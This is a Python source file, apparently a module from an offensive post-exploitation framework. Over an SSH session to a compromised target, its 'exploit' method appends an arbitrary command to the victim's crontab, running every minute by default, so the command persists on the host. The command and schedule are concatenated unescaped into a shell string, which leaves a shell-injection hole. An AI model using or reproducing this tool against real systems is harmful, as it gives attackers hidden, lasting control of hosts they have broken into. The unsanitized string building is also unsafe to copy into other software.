from module import *

class Cron(Module):
    
    def __init__(self, target, command, core):
        self.core = core
        self.target = target
        self.name = "Cron"
        self.command = command
        self.options = {
                "frequency": Option("frequency", "* * * * *", "how often to run command", False),
                }
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None

    def exploit(self):
        command = self.command
        frequency = self.get_value("frequency")
        self.target.ssh.exec_command("crontab -l > mycron")
        self.target.ssh.exec_command("echo \"" + frequency + " " + command + "\" >> mycron && crontab mycron && rm mycron")
        print(GOOD + self.name + " module success")
